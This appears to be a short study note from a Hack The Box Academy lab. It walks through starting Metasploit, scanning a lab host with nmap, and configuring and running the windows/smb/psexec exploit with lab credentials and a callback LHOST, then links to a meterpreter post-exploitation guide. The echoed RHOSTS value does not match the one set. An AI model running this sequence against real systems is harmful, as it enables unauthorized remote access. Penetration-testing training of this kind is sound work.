---
layout:
  title:
    visible: false
  description:
    visible: false
  tableOfContents:
    visible: false
  outline:
    visible: false
  pagination:
    visible: false
---

# Automating Payloads & Delivery with Metasploit

Starting MSF

```
sudo msfconsole 
```

NMAP Scan

```
nmap -sC -sV -Pn 10.129.164.25
```

Searching Within Metasploit

```
msf6 > search smb
```

Option Selection

```
msf6 > use 56
```

Examining an Exploit's Options

```
msf6 exploit(windows/smb/psexec) > options
```

Setting Options

```
msf6 exploit(windows/smb/psexec) > set RHOSTS 10.129.180.71
RHOSTS => 10.129.142.172
msf6 exploit(windows/smb/psexec) > set SHARE ADMIN$
SHARE => ADMIN$
msf6 exploit(windows/smb/psexec) > set SMBPass HTB_@cademy_stdnt!
SMBPass => HTB_@cademy_stdnt!
msf6 exploit(windows/smb/psexec) > set SMBUser htb-student
SMBUser => htb-student
msf6 exploit(windows/smb/psexec) > set LHOST 10.10.14.222
LHOST => 10.10.14.222
```

Exploits Away

```
msf6 exploit(windows/smb/psexec) > exploit
```

{% embed url="https://www.getastra.com/blog/security-audit/meterpreter-commands-post-exploitation/" %}
